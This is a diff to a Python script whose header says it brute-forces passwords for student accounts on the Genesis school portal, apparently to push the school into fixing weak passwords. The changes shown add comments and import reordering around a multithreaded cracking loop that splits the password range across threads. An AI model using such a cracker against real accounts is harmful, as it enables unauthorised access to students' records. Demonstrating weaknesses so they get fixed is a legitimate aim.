@@ -1,10 +1,13 @@
+# Cracks passwords for genesis (https://www.genesisedu.com/) student accounts
+# This is to show how easy it is for student passowrds to be cracked in a hope the school will fix this problem
+
+from datetime import datetime
 import threading
 import requests
 import hashlib
+import time
 import os
 import re
-import time
-from datetime import datetime
 
 ############ VARS ############
 configFile = 'config/config.confnose'
@@ -97,6 +100,7 @@ class check(threading.Thread):
 
 
 def main():
+    # Read Configvalues from the config file and assign them to vars
     DebugPrint('Main', 'Starting...', 'green')
     config = cfg()
     config.read(configFile)
@@ -108,9 +112,11 @@ def main():
     threads = int(config.get('threads'))
     startTime = time.time()
 
+    # Check if username is valid
     if not uNameCheck(uName): raise Exception
     DebugPrint("Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")
 
+    # Create threads to check for the password
     for i in range(threads):
         startIndex = int((pWordIta/threads - 1))
         endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
